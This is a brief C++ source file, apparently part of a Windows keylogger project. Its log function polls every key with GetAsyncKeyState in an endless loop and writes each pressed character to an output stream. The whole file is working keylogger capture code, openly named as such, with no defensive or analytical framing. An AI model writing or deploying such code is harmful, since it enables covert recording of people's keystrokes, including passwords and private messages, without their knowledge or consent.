#include "LoopKeyLogger.h"

namespace loopKeyLogger
{
	void log(std::ostream& out)
	{
		while (true)
		{
			for (unsigned char i = 0; i < 255; i++)
			{
				const SHORT keyState = GetAsyncKeyState(i);
				if (keyState && (keyState ^ 1) == keyState - 1) {
					if (utils::is_alpha_num_key(i)) {
						out << static_cast<char>(i) << std::endl;
					}
					else
					{
						Character* ptr = CharacterHandler::getCharacterByKeyCode(i);
						if (ptr) {
							out << *CharacterHandler::getCharacterByKeyCode(i) << std::endl;
						}
					}
				}
			}
		}
	}
}